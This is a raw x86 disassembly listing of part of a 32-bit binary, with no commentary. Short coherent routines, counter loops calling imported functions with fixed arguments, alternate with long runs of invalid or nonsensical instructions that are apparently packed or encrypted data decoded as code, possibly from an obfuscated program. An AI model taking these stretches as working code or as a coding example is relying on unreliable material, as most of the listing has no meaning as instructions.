  405107:	ja     0x4054d4
  40510d:	and    DWORD PTR ds:0x4337ff,0x0
  405117:	jmp    0x40512b
  40511c:	xor    edx,edx
  40511e:	add    edx,DWORD PTR ds:0x4337ff
  405124:	inc    edx
  405125:	mov    DWORD PTR ds:0x4337ff,edx
  40512b:	cmp    DWORD PTR ds:0x4337ff,0x17
  405132:	jae    0x40515a
  405138:	cmp    DWORD PTR ds:0x4337ff,0x18
  40513f:	jne    0x405155
  405145:	push   0x19d0
  40514a:	push   0x338d
  40514f:	call   DWORD PTR ds:0x412004
  405155:	jmp    0x40511c
  40515a:	mov    edx,DWORD PTR [ebp-0x4]
  40515d:	sbb    DWORD PTR ds:0x4337eb,0x43376f
  405167:	xor    edx,eax
  405169:	xor    DWORD PTR ds:0x4337e7,0x55d1
  405173:	jmp    0x4054cd
  405178:	cdq    
  405179:	jp     0x4051e8
  40517b:	pushf  
  40517c:	ins    DWORD PTR es:[edi],dx
  40517d:	imul   ebp,DWORD PTR [ecx+0x7b],0x879a2b7f
  405184:	scas   al,BYTE PTR es:[edi]
  405185:	sahf   
  405186:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405187:	mov    esp,0x7e7e28f4
  40518c:	xor    edi,DWORD PTR [ebp+0x7e]
  40518f:	jle    0x405173
  405191:	push   esp
  405192:	les    esi,FWORD PTR [ebx*8-0x50da3472]
  405199:	mov    edi,0x5e58ccbd
  40519e:	dec    esi
  40519f:	out    0x46,al
  4051a1:	rcr    BYTE PTR [esi],1
  4051a3:	mov    WORD PTR [edx],es
  4051a5:	and    DWORD PTR [ebx+0x532ccc4f],ecx
  4051ab:	in     eax,dx
  4051ac:	or     ebx,DWORD PTR [edi+0x7367637d]
  4051b2:	push   ds
  4051b3:	xchg   ebp,eax
  4051b4:	cmp    ch,BYTE PTR [esp+esi*2+0x33]
  4051b8:	xchg   ebx,eax
  4051b9:	and    eax,0x115e7780
  4051be:	inc    ebp
  4051bf:	and    BYTE PTR [eax],0x7c
  4051c2:	add    eax,ecx
  4051c4:	dec    ebp
  4051c5:	outs   dx,DWORD PTR ds:[esi]
  4051c6:	js     0x40516b
  4051c8:	bound  ebx,QWORD PTR [ebx+0x18]
  4051cb:	lods   al,BYTE PTR ds:[esi]
  4051cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4051cd:	xchg   esi,eax
  4051ce:	scas   al,BYTE PTR es:[edi]
  4051cf:	icebp  
  4051d0:	imul   ebx,DWORD PTR [edx+edx*4-0x18],0x42832e21
  4051d8:	xor    BYTE PTR [edx],ah
  4051da:	lds    esp,FWORD PTR [eax]
  4051dc:	add    eax,0xfabcc5af
  4051e1:	push   0x780bbab7
  4051e6:	xchg   ecx,eax
  4051e7:	dec    ebx
  4051e8:	inc    esi
  4051e9:	bound  eax,QWORD PTR [eax+0x7c64608d]
  4051ef:	lea    edi,[edx]
  4051f1:	ins    BYTE PTR es:[edi],dx
  4051f2:	lock and DWORD PTR [edx+ebp*1+0x1a65c76d],ebp
  4051fa:	xchg   ecx,eax
  4051fb:	pop    es
  4051fc:	sar    BYTE PTR [esi],1
  4051fe:	dec    ebp
  4051ff:	add    al,BYTE PTR ds:0xbde529d
  405205:	sbb    eax,0xdb4e002f
  40520a:	retf   
  40520b:	jbe    0x405281
  40520d:	xchg   BYTE PTR [ebx+0x37],al
  405210:	jbe    0x405239
  405212:	not    dh
  405214:	retf   0x8b71
  405217:	adc    BYTE PTR [esi+eax*4+0x1a],cl
  40521b:	pop    ebp
  40521c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40521d:	xor    al,0xa0
  40521f:	mov    al,0x91
  405221:	inc    ecx
  405222:	fldcw  WORD PTR [edi]
  405224:	jae    0x405222
  405226:	or     al,0x85
  405228:	xor    DWORD PTR [ebx],eax
  40522a:	clc    
  40522b:	les    ecx,FWORD PTR [edx]
  40522d:	jns    0x4051ea
  40522f:	sete   ch
  405232:	dec    edx
  405233:	jg     0x4051c7
  405235:	or     eax,ecx
  405237:	jmp    0x9dc30e47
  40523c:	les    edi,FWORD PTR [ecx+0x34]
  40523f:	pusha  
  405240:	or     BYTE PTR gs:[eax-0x7a],al
  405244:	jbe    0x4052b6
  405246:	and    esp,esi
  405248:	or     cl,dh
  40524a:	xchg   edi,eax
  40524b:	std    
  40524c:	push   ebx
  40524d:	aad    0x19
  40524f:	add    DWORD PTR [ebx+esi*1+0x3e20e3d7],eax
  405256:	mov    bh,0x22
  405258:	cli    
  405259:	add    BYTE PTR [ebp+0x58a83ac9],bh
  40525f:	push   esp
  405260:	loop   0x40524a
  405262:	pop    ds
  405263:	sbb    BYTE PTR [ebp+0x1c156e81],cl
  405269:	ror    DWORD PTR [ebx-0x62f4b7dd],cl
  40526f:	add    al,0x7e
  405271:	shl    DWORD PTR [ecx-0xb13726c],cl
  405277:	dec    esp
  405278:	sub    eax,0x30
  40527b:	addr16 add eax,0x51b01d78
  405281:	data16 fidivr DWORD PTR [edx+0x11]
  405285:	sahf   
  405286:	pop    ebx
  405287:	pop    ecx
  405288:	sub    ch,BYTE PTR [ebx-0x32cb1db9]
  40528e:	scas   al,BYTE PTR es:[edi]
  40528f:	xchg   ebp,eax
  405290:	add    edx,DWORD PTR [ecx+0xd]
  405293:	lahf   
  405294:	xor    bl,BYTE PTR [edi+0x38076b10]
  40529a:	jo     0x4052e8
  40529c:	push   ebx
  40529d:	mov    ds,ebp
  40529f:	faddp  st(4),st
  4052a1:	jp     0x4052eb
  4052a3:	out    0x20,al
  4052a5:	stc    
  4052a6:	push   edi
  4052a7:	add    al,0xbc
  4052a9:	sahf   
  4052aa:	sbb    eax,DWORD PTR [ecx-0x2b6d4d0]
  4052b0:	inc    edi
  4052b1:	push   eax
  4052b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4052b3:	scas   al,BYTE PTR es:[edi]
  4052b4:	mov    eax,0x1d698904
  4052b9:	inc    esi
  4052ba:	xor    DWORD PTR [edx+0x27],eax
  4052bd:	xchg   ebp,eax
  4052be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4052bf:	ret    
  4052c0:	mov    al,0xa7
  4052c2:	pop    ebx
  4052c3:	push   esi
  4052c4:	aas    
  4052c5:	jle    0x405300
  4052c7:	retf   0x2d87
  4052ca:	pop    ss
  4052cb:	test   eax,0x15d06e63
  4052d0:	xor    eax,0xd7821dbf
  4052d5:	mov    esi,0x66a17fa5
  4052da:	jecxz  0x40531f
  4052dc:	mov    dh,ah
  4052de:	lahf   
  4052df:	iret   
  4052e0:	sbb    edi,DWORD PTR es:[ebx+0x3e0601ec]
  4052e7:	aas    
  4052e8:	jno    0x40535a
  4052ea:	sub    BYTE PTR [ebx+0x2da19d4],ah
  4052f0:	jne    0x4052ac
  4052f2:	neg    bl
  4052f4:	sbb    al,0x3b
  4052f6:	dec    edi
  4052f7:	dec    esp
  4052f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4052f9:	sbb    BYTE PTR [ebp+eax*4-0x1a],bl
  4052fd:	inc    ebp
  4052fe:	sbb    eax,0xbcd44b28
  405303:	adc    eax,0x12623614
  405308:	ins    BYTE PTR es:[edi],dx
  405309:	cmc    
  40530a:	cmp    al,0x47
  40530c:	scas   eax,DWORD PTR es:[edi]
  40530d:	pop    ebx
  40530e:	loope  0x4052d4
  405310:	jnp    0x4052c9
  405312:	stos   DWORD PTR es:[edi],eax
  405313:	pop    edx
  405314:	fwait
  405315:	mov    edi,0x8f3121b6
  40531a:	scas   eax,DWORD PTR es:[edi]
  40531b:	inc    ebx
  40531c:	adc    al,0x15
  40531e:	jl     0x4052f0
  405320:	sub    DWORD PTR ds:0xd8a84bd7,ebx
  405326:	sti    
  405327:	mov    ds:0x9f76fc2,eax
  40532c:	cmc    
  40532d:	scas   al,BYTE PTR es:[edi]
  40532e:	push   ss
  40532f:	lods   eax,DWORD PTR ds:[esi]
  405330:	push   ebp
  405331:	xor    eax,0x453d25e5
  405336:	scas   eax,DWORD PTR es:[edi]
  405337:	push   ds
  405338:	cmp    ah,BYTE PTR [ebx+0x29716d26]
  40533e:	popa   
  40533f:	sub    dh,BYTE PTR [ecx+0x53]
  405342:	jno    0x405356
  405344:	leave  
  405345:	dec    esi
  405346:	mov    es,WORD PTR [edx+0x2322bb7b]
  40534c:	fisub  WORD PTR [eax-0x41]
  40534f:	inc    esi
  405350:	cmp    ebx,DWORD PTR [edi+ecx*4+0x50]
  405354:	ret    0x8d78
  405357:	push   0xffffffb1
  405359:	mov    ecx,0x4a2069ee
  40535e:	pop    edx
  40535f:	sub    DWORD PTR [edx-0x24],0xb1d7f9e3
  405366:	rol    BYTE PTR es:[eax-0x3b],1
  40536a:	inc    esi
  40536b:	(bad)  
  40536c:	jmp    0x405356
  40536e:	add    esi,DWORD PTR [edi+eiz*4]
  405371:	mov    WORD PTR [ebp-0x2b],es
  405374:	and    DWORD PTR [edx+edx*1],esp
  405377:	arpl   WORD PTR [edi+ebp*8],dx
  40537a:	sub    bh,BYTE PTR [ebx]
  40537c:	dec    ecx
  40537d:	mov    edi,0x243f05e4
  405382:	shr    DWORD PTR [ecx+eiz*2],0xdc
  405386:	fs rdtsc 
  405389:	(bad)  
  40538a:	mov    edi,0xc637f174
  40538f:	clc    
  405390:	jle    0x40538e
  405392:	sub    edx,DWORD PTR [ecx-0x50258686]
  405398:	push   cs
  405399:	ret    0xd056
  40539c:	aas    
  40539d:	xlat   BYTE PTR ds:[ebx]
  40539e:	dec    ebx
  40539f:	ffreep st(2)
  4053a1:	(bad)
  4053a5:	nop
  4053a6:	aaa    
  4053a7:	sbb    DWORD PTR [eax],edx
  4053a9:	pushf  
  4053aa:	pusha  
  4053ab:	bound  ecx,QWORD PTR [ebx+0x32dcb624]
  4053b1:	pop    es
  4053b2:	mov    ds:0xed4c0b12,al
  4053b7:	icebp  
  4053b8:	loop   0x405408
  4053ba:	pop    es
  4053bb:	pop    ebx
  4053bc:	ds aaa 
  4053be:	sbb    DWORD PTR [edi-0x1363ccd8],ecx
  4053c4:	ds push cs
  4053c6:	shl    BYTE PTR [ebp+ebx*1+0x44db46ff],1
  4053cd:	push   ebx
  4053ce:	sub    DWORD PTR ds:0x7883fba4,0xfffffffb
  4053d5:	push   ss
  4053d6:	push   edi
  4053d7:	mov    bl,0x97
  4053d9:	dec    esp
  4053da:	xchg   ecx,eax
  4053dc:	push   eax
  4053dd:	mov    esp,0xcb1b5a8d
  4053e2:	pop    ds
  4053e3:	sub    cl,dh
  4053e5:	mov    bl,0xc5
  4053e7:	clc    
  4053e8:	mov    ecx,0x79d8680d
  4053ed:	push   edx
  4053ee:	dec    esi
  4053ef:	(bad)  
  4053f0:	iret   
  4053f1:	jne    0x40540c
  4053f3:	pop    edx
  4053f4:	stos   BYTE PTR es:[edi],al
  4053f5:	pop    ebx
  4053f6:	add    bh,BYTE PTR [edx-0x70]
  4053f9:	or     dh,BYTE PTR [edx+ebp*4+0x6f]
  4053fd:	not    dl
  4053ff:	xchg   edx,edx
  405401:	add    eax,0xffffff9f
  405404:	neg    BYTE PTR [eax-0x70fc33ea]
  40540a:	cwde   
  40540b:	int    0xe6
  40540d:	or     BYTE PTR [ecx+0x6a06e8a],dh
  405413:	jp     0x405464
  405415:	add    edi,DWORD PTR [esi]
  405417:	iret   
  405418:	inc    ebp
  405419:	cli    
  40541a:	loopne 0x40543b
  40541c:	ds stos BYTE PTR es:[edi],al
  40541e:	fimul  DWORD PTR [edi+0x45]
  405421:	adc    eax,0xc0bc9c80
  405426:	jmp    0x4053ca
  405428:	imul   edx,DWORD PTR [eax+ecx*4],0xffffffd9
  40542c:	dec    eax
  40542d:	add    dh,cl
  40542f:	or     eax,0x2a7174f6
  405434:	adc    edi,ebx
  405436:	pushf  
  405437:	sub    ecx,DWORD PTR [ebx-0x42]
  40543a:	sahf   
  40543b:	xchg   ebp,eax
  40543c:	and    DWORD PTR [ecx],esi
  40543e:	clc    
  40543f:	dec    esi
  405440:	mov    edx,0x6c46b3a9
  405445:	ins    DWORD PTR es:[edi],dx
  405446:	and    esi,0x0
  405449:	push   eax
  40544a:	sub    dh,dh
  40544c:	mov    ebp,0xcba254d2
  405451:	push   esp
  405452:	(bad)  
  405454:	jmp    0xa821707c
  405459:	call   0xa9c6a27d
  40545e:	cmp    esi,DWORD PTR [edi-0x20]
  405461:	jp     0x405449
  405463:	cmp    ch,ah
  405465:	pop    es
  405466:	scas   al,BYTE PTR es:[edi]
  405467:	adc    al,0xfa
  405469:	shr    DWORD PTR [eax+0x57d62597],0x25
  405470:	pushf  
  405471:	fdivrp st(5),st
  405473:	jl     0x4054cf
  405475:	mov    al,0x55
  405477:	lahf   
  405478:	pop    esi
  405479:	adc    eax,DWORD PTR [edx+0x7cbb5b3f]
  40547f:	rol    BYTE PTR [edx-0x39],cl
  405482:	push   ebx
  405483:	and    al,0x7e
  405485:	mov    bh,0x8b
  405487:	sahf   
  405488:	ret    
  405489:	inc    eax
  40548a:	adc    al,0xb3
  40548c:	cmp    BYTE PTR [edx+ecx*8],al
  40548f:	sub    DWORD PTR [edx],0x995b0bbc
  405495:	sbb    DWORD PTR [esi],ecx
  405497:	out    dx,al
  405498:	pop    eax
  405499:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40549a:	push   cs
  40549b:	sbb    BYTE PTR [esi],bh
  40549d:	in     al,0xc
  40549f:	or     eax,0xb42be96e
  4054a4:	clc    
  4054a5:	mov    bl,0xdc
  4054a7:	or     cl,BYTE PTR [ebx-0x24d70ce]
  4054ad:	adc    al,0x35
  4054af:	mov    esi,0x9e150ab3
  4054b4:	cdq    
  4054b5:	pushf  
  4054b6:	jl     0x405517
  4054b8:	jle    0x405450
  4054ba:	test   DWORD PTR [edi-0x6cfbf9fe],ebp
  4054c0:	mov    ah,0xb5
  4054c2:	dec    esp
  4054c3:	pop    ds
  4054c4:	imul   esi,edx,0xffffffe6
  4054c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4054c8:	xchg   esp,eax
  4054c9:	push   es
  4054ca:	fsub   QWORD PTR [edx-0x162efc63]
  4054d0:	push   ss
  4054d1:	sldt   WORD PTR [eax]
  4054d4:	mov    edx,DWORD PTR [ebp-0x2c]
  4054d7:	mov    edi,DWORD PTR [ebp-0x4]
  4054da:	xor    edx,eax
  4054dc:	movzx  ebx,BYTE PTR ds:0x4337e7
  4054e3:	or     DWORD PTR ds:0x433803,ebx
  4054e9:	xor    edi,eax
  4054eb:	and    DWORD PTR ds:0x4337f3,0x0
  4054f5:	xor    ebx,ebx
  4054f7:	add    ebx,DWORD PTR ds:0x4337f3
  4054fd:	inc    ebx
  4054fe:	mov    DWORD PTR ds:0x4337f3,ebx
  405504:	cmp    DWORD PTR ds:0x4337f3,0x6
  40550b:	jne    0x40552b
  405511:	push   0x1804
  405516:	push   0x80d8
  40551b:	push   0x74bc
  405520:	push   0x5a14
  405525:	call   DWORD PTR ds:0x412370
  40552b:	cmp    DWORD PTR ds:0x4337f3,0x5
  405532:	jne    0x405545
  405538:	mov    ebx,DWORD PTR ds:0x4337f3
  40553e:	inc    ebx
  40553f:	mov    DWORD PTR ds:0x4337f3,ebx
  405545:	cmp    DWORD PTR ds:0x4337f3,0x1e
  40554c:	jb     0x4054f5
  405552:	mov    DWORD PTR ds:0x4337f7,0x387c
  40555c:	add    edi,ecx
  40555e:	add    edx,ecx
  405560:	imul   edx,edi
  405563:	mov    edi,DWORD PTR [ebp-0x8]
  405566:	and    DWORD PTR ds:0x4337b7,0x0
  405570:	mov    ebx,DWORD PTR ds:0x4337b7
  405576:	inc    ebx
  405577:	mov    DWORD PTR ds:0x4337b7,ebx
  40557d:	cmp    DWORD PTR ds:0x4337b7,0x2c
  405584:	jne    0x4055b0
  40558a:	push   DWORD PTR [ebp-0x28]
  40558d:	push   0x7933
  405592:	push   0x433946
  405597:	push   DWORD PTR [ebp-0x28]
  40559a:	push   DWORD PTR [ebp-0x24]
  40559d:	push   DWORD PTR [ebp-0x1c]
  4055a0:	push   0x42e0
  4055a5:	push   0x392f
  4055aa:	call   DWORD PTR ds:0x412374
  4055b0:	cmp    DWORD PTR ds:0x4337b7,0x1e
  4055b7:	jb     0x405570
  4055bd:	mov    ebx,DWORD PTR [ebp-0x10]
  4055c0:	sub    ebx,edi
  4055c2:	cmp    ebx,edx
  4055c4:	ja     0x4055d2
  4055ca:	mov    edx,DWORD PTR [ebp-0x28]
  4055cd:	jmp    0x4063dc
  4055d2:	mov    edx,DWORD PTR [ebp-0x30]
  4055d5:	mov    edi,DWORD PTR [ebp-0x4]
  4055d8:	xor    edx,eax
  4055da:	xor    edi,eax
  4055dc:	add    edi,ecx
  4055de:	add    edx,ecx
  4055e0:	imul   edx,edi
  4055e3:	mov    edi,DWORD PTR [ebp-0x8]
  4055e6:	mov    ebx,DWORD PTR [ebp-0x10]
  4055e9:	sub    ebx,edi
  4055eb:	cmp    ebx,edx
  4055ed:	ja     0x4055fb
  4055f3:	mov    edx,DWORD PTR [ebp-0x2c]
  4055f6:	jmp    0x4063dc
  4055fb:	mov    edx,DWORD PTR [ebp-0x34]
  4055fe:	mov    edi,DWORD PTR [ebp-0x4]
  405601:	xor    edx,eax
  405603:	xor    edi,eax
  405605:	add    edi,ecx
  405607:	add    edx,ecx
  405609:	imul   edx,edi
  40560c:	mov    edi,DWORD PTR [ebp-0x8]
  40560f:	mov    ebx,DWORD PTR [ebp-0x10]
  405612:	sub    ebx,edi
  405614:	cmp    ebx,edx
  405616:	ja     0x40597e
  40561c:	jmp    0x405976
  405621:	(bad)  [eax+0x65]
  405624:	pop    eax
  405625:	jne    0x405698
  405627:	loope  0x405672
  405629:	clc    
  40562a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40562b:	dec    ebp
  40562c:	push   0xb75b259a
  405631:	test   eax,0x337e7e37
  405636:	jge    0x4056b6
  405638:	jle    0x4055f9
  40563a:	sbb    DWORD PTR [ebx-0x6a31dccc],esi
  405640:	mov    eax,ds:0xdc364488
  405645:	xchg   esi,eax
  405646:	(bad)  
  405647:	fistp  DWORD PTR [edx-0x767942d]
  40564d:	call   0x4ae072d9
  405652:	mov    edx,0x42e7dd61
  405657:	pop    ecx
  405658:	cmc    
  405659:	and    ah,BYTE PTR [esi-0x5b]
  40565c:	dec    esp
  40565d:	or     eax,0xafc5c3b7
  405662:	sbb    eax,0xfdb04dfa
  405667:	dec    ecx
  405668:	nop
  405669:	mov    dh,BYTE PTR [eax]
  40566b:	les    edx,FWORD PTR [esi-0x216ca6bc]
  405671:	push   cs
  405672:	sti    
  405673:	shl    DWORD PTR [eax-0x292118d9],1
  405679:	and    al,0xe7
  40567b:	xchg   ch,ch
  40567d:	rcl    bh,0xec
  405680:	mov    ebx,0x4c24f71b
  405685:	and    DWORD PTR [esi],0x1c
  405688:	xor    DWORD PTR [ebx],edi
  40568a:	ss test eax,0xe0193ed6
  405690:	ficom  WORD PTR [ebx-0x32083399]
  405696:	(bad)  [eax+0x70980a76]
  40569c:	in     al,dx
  40569d:	sahf   
  40569e:	xchg   esp,eax
  40569f:	mov    ds:0xf4946426,al
  4056a4:	push   es
  4056a5:	push   ebx
  4056a6:	cmc    
  4056a7:	cmc    
  4056a8:	and    edx,DWORD PTR [edx-0x31]
  4056ab:	jg     0x40567b
  4056ad:	aaa    
  4056ae:	das    
  4056af:	sbb    bh,BYTE PTR [ecx+0x286d9ffc]
  4056b5:	xchg   BYTE PTR [eax+0x66],bh
  4056b8:	int    0xfc
  4056ba:	(bad)  
  4056bb:	jle    0x4056f4
  4056bd:	mov    cl,0x48
  4056bf:	or     BYTE PTR [ecx-0x67d9e5a7],ah
  4056c5:	or     al,0xa5
  4056c7:	data16 mov bh,0xa7
  4056ca:	sbb    BYTE PTR [ebp+0x75],0x77
  4056ce:	outs   dx,BYTE PTR ds:[esi]
  4056cf:	adc    eax,0x242265c2
  4056d4:	pop    esi
  4056d5:	xchg   ecx,eax
  4056d6:	pop    eax
  4056d7:	cmp    DWORD PTR [esi+0x3ce3225b],eax
  4056dd:	(bad)  
  4056de:	call   0x4530:0x64137a3d
  4056e5:	test   DWORD PTR [edx+esi*1+0x49],edx
  4056e9:	adc    DWORD PTR [eax],edx
  4056eb:	sub    DWORD PTR [ecx-0x564b68cf],esp
  4056f1:	dec    edx
  4056f2:	dec    esp
  4056f3:	ja     0x40569b
  4056f5:	adc    ah,BYTE PTR [ecx]
  4056f7:	jno    0x4056e6
  4056f9:	push   edx
  4056fa:	call   0x51abd230
  4056ff:	lods   eax,DWORD PTR ds:[esi]
  405700:	push   esp
  405701:	retf   0x4aa1
  405704:	fisttp WORD PTR [ebx-0x3c5d16d]
  40570a:	or     al,0x86
  40570c:	ret    0x15ea
  40570f:	cmp    bl,BYTE PTR [ebp+0x2c69d36f]
  405715:	xor    dh,cl
  405717:	jbe    0x405703
  405719:	xor    al,BYTE PTR [edx+0xb]
  40571c:	jle    0x405705
  40571e:	out    dx,al
  40571f:	repnz inc ecx
  405721:	ins    BYTE PTR es:[edi],dx
  405722:	jb     0x405719
  405724:	push   0xffffffe2
  405726:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405727:	and    ah,BYTE PTR [edx+esi*8+0x57307233]
  40572e:	or     ebp,esp
  405730:	mov    al,0x8c
  405732:	xchg   edi,eax
  405733:	push   0x14
  405735:	scas   eax,DWORD PTR es:[edi]
  405736:	and    DWORD PTR [esi-0x2f25a74c],ebp
  40573c:	mov    esi,0xee6ee016
  405741:	in     eax,0x17
  405743:	push   esp
  405744:	sbb    ebp,eax
  405746:	pop    eax
  405747:	popf   
  405748:	dec    esp
  405749:	lea    ebp,[eax]
  40574b:	std    
  40574c:	mov    BYTE PTR ds:0xd49fbe62,bl
  405752:	fadd   DWORD PTR [edx-0x5b8e7a0]
  405758:	mov    ds:0x8811bb2,al
  40575d:	dec    ebx
  40575e:	dec    ecx
  40575f:	mov    ecx,DWORD PTR [ecx]
  405761:	rcl    bh,1
  405763:	pop    esp
  405764:	push   ecx
  405765:	fmul   DWORD PTR [eax+ebx*4+0x2449d5c7]
  40576c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40576d:	lods   al,BYTE PTR ds:[esi]
  40576e:	push   esp
  40576f:	mov    ebp,0x41406d2b
  405774:	les    esp,FWORD PTR [ecx+0x51686cd3]
  40577a:	mov    WORD PTR [ebp-0x17],ds
  40577d:	adc    ah,BYTE PTR [edx]
  40577f:	pop    edx
  405780:	inc    edx
  405781:	and    BYTE PTR [eax],al
  405783:	lods   al,BYTE PTR ds:[esi]
  405784:	ss iret 
  405786:	mov    edx,0xadec6e50
  40578b:	aad    0x11
  40578d:	mov    DWORD PTR [eax-0x43],esi
  405790:	inc    ebp
  405791:	leave  
  405792:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405793:	stos   BYTE PTR es:[edi],al
  405794:	xchg   DWORD PTR [eax],edi
  405796:	mov    eax,ds:0xd7cb5d1c
  40579b:	xchg   esi,eax
  40579c:	dec    esp
  40579d:	test   BYTE PTR [ecx-0x42],ah
  4057a0:	and    ebp,ecx
  4057a2:	int3   
  4057a3:	mov    eax,ds:0xd6d48525
  4057a8:	push   ds
  4057a9:	jp     0x4057a3
  4057ab:	retf   0x1d53
  4057ae:	add    BYTE PTR [edi-0x3e],0x9c
  4057b2:	(bad)  
  4057b3:	loope  0x40582c
  4057b5:	(bad)  
  4057b6:	jp     0x40580c
  4057b8:	xor    BYTE PTR [esi],0xb0
  4057bb:	push   ebp
  4057bc:	hlt    
  4057bd:	mov    ds:0x920827a,eax
  4057c2:	xlat   BYTE PTR ds:[ebx]
  4057c3:	mov    BYTE PTR [ecx],dl
  4057c5:	add    al,0x24
  4057c7:	sti    
  4057c8:	imul   ebx,esp,0x48847cf9
  4057ce:	adc    BYTE PTR [esi+0x272cf9f6],bh
  4057d4:	or     BYTE PTR [ecx],0x3
  4057d7:	ins    DWORD PTR es:[edi],dx
  4057d8:	into   
  4057d9:	std    
  4057da:	add    al,0x2f
  4057dc:	hlt    
  4057dd:	sbb    cl,BYTE PTR ds:0x6e1b3557
  4057e3:	dec    ecx
  4057e4:	js     0x405860
  4057e6:	mov    ah,ah
  4057e8:	inc    ebp
  4057e9:	wrmsr  
  4057eb:	iret   
  4057ec:	mov    dh,0x3
  4057ee:	push   ds
  4057ef:	xchg   esp,eax
  4057f0:	jecxz  0x4057a9
  4057f2:	xchg   esi,eax
  4057f3:	mov    ebp,0x4d3bd01b
  4057f8:	jns    0x40580d
  4057fa:	int    0xc7
  4057fc:	push   edx
  4057fd:	jbe    0x405877
  4057ff:	mov    ?,eax
  405801:	mov    ecx,eax
  405803:	in     eax,dx
  405804:	shl    DWORD PTR [edi],1
  405806:	dec    edx
  405807:	mov    dl,0x1f
  405809:	cdq    
  40580a:	cmp    dl,al
  40580c:	xor    al,0xd1
  40580e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40580f:	jo     0x40584f
  405811:	cwde   
  405812:	je     0x405797
  405814:	cmp    eax,0xdf3cd7d2
  405819:	(bad)  
  40581b:	(bad)  
  40581c:	mov    eax,0x8a17f9c3
  405821:	jne    0x405810
  405823:	xchg   DWORD PTR [edi],ebp
  405825:	mov    bh,0x56
  405827:	pop    ebp
  405828:	mov    esi,0xe0267fc5
  40582d:	mov    ss,WORD PTR [esi]
  40582f:	push   edx
  405830:	imul   esi,DWORD PTR [ecx+0xd2a72f],0x38
  405837:	nop
  405838:	test   DWORD PTR [eax+0x4a82bad2],esp
  40583e:	in     eax,0xec
  405840:	push   ds
  405841:	sbb    BYTE PTR [edx-0x27],al
  405844:	(bad)  
  405846:	push   edi
  405847:	mov    dl,0xb8
  405849:	fs xchg edi,eax
  40584b:	pop    eax
  40584c:	(bad)
  405851:	psubq  mm1,QWORD PTR [ebx+0x1041f95e]
  405858:	mov    esi,DWORD PTR [edi]
  40585a:	add    DWORD PTR [ecx],edi
  40585c:	cdq    
  40585d:	push   esi
  40585e:	retf   
  40585f:	or     eax,0xd7374dc2
  405864:	rol    BYTE PTR [edx+esi*1],1
  405867:	and    al,0x4a
  405869:	or     dl,cl
  40586b:	pushf  
  40586c:	jl     0x40588a
  40586e:	jb     0x405826
  405870:	xor    al,0xe5
  405872:	xlat   BYTE PTR ds:[ebx]
  405873:	push   edi
  405874:	adc    DWORD PTR [edx-0x40],eax
  405877:	or     DWORD PTR [edx+0x6b],ecx
  40587a:	pushf  
  40587b:	push   esi
  40587c:	(bad)  
  40587e:	mov    esp,0x1a43dc58
  405883:	lds    ebx,FWORD PTR [edx+0x4c]
  405886:	mov    DWORD PTR [ecx+0x2],esi
  405889:	fcomp  DWORD PTR [eax+0x55]
  40588c:	xchg   DWORD PTR [ecx-0x39bd73e4],ecx
  405892:	mov    esp,0x6849ec7d
  405897:	mov    ebx,0x9499ac6f
  40589c:	fs dec eax
  40589e:	enter  0x4c52,0xa1
  4058a2:	shl    DWORD PTR [ebx+0x22],1
  4058a5:	pop    ds
  4058a6:	div    eax
  4058a8:	ds pop esi
  4058aa:	adc    BYTE PTR [ecx],ah
  4058ac:	(bad)  
  4058ad:	lds    edi,FWORD PTR [ecx-0x199d366c]
  4058b3:	lea    ebp,[esi+0x3336dc2b]
  4058b9:	fistp  QWORD PTR [eax]
  4058bb:	dec    edx
  4058bc:	mov    DWORD PTR [edx],esp
  4058be:	icebp  
  4058bf:	das    
  4058c0:	pop    eax
  4058c1:	icebp  
  4058c2:	mov    bh,0xb0
  4058c4:	or     al,0x2a
  4058c6:	xor    BYTE PTR [ebx+0x64],dl
  4058c9:	xor    ch,ah
  4058cb:	(bad)  
  4058cc:	lods   eax,DWORD PTR ds:[esi]
  4058cd:	mov    edx,0x7b4b0635
  4058d2:	sub    ah,BYTE PTR [edi]
  4058d4:	fcmove st,st(6)
  4058d6:	les    esi,FWORD PTR [edi+0x3975997e]
  4058dc:	xor    bh,cl
  4058de:	mov    esp,0xf2145e81
  4058e3:	out    0xb9,al
  4058e5:	ins    DWORD PTR es:[di],dx
  4058e7:	inc    ecx
  4058e8:	cs (bad) 
  4058eb:	es push esi
  4058ed:	mov    cl,0xb1
  4058ef:	rol    al,cl
  4058f1:	push   0xffffff9b
  4058f3:	stos   DWORD PTR es:[edi],eax
  4058f4:	fimul  WORD PTR [edx-0x6c5bbd7a]
  4058fa:	lahf   
  4058fb:	add    DWORD PTR [ecx+edx*2],edx
  4058fe:	pushf  
  4058ff:	fiadd  WORD PTR [esp+ebx*4+0x32]
  405903:	dec    eax
  405904:	leave  
  405905:	pop    esi
  405906:	or     cl,dl
  405908:	cmp    al,0x9e
  40590a:	out    dx,al
  40590b:	(bad)  
  40590c:	inc    ebp
  40590d:	sbb    eax,0x3343fff
  405912:	mov    BYTE PTR [edi+edi*4+0xf2c6dd4],ch
  405919:	lods   eax,DWORD PTR ds:[esi]
  40591a:	cs push esp
  40591c:	jbe    0x405989
  40591e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40591f:	in     al,0xdb
  405921:	push   eax
  405922:	aam    0xdb
  405924:	mov    ch,0xa4
  405926:	and    edx,DWORD PTR [edi+ebp*2-0x26]
  40592a:	shl    DWORD PTR [edx+0x15050f94],0x42
  405931:	fcom   DWORD PTR [ebx+0xeea0235]
  405937:	fistp  QWORD PTR [esi+0x8d5f5f8]
  40593d:	cmp    DWORD PTR [edx+0x16],edx
  405940:	stc    
  405941:	gs ret 0xeeb5
  405945:	nop
  405946:	push   0xaf2737f7
  40594b:	(bad)  
  40594c:	hlt    
  40594d:	pop    es
  40594e:	xchg   esp,eax
  40594f:	mov    al,ds:0x56f53df5
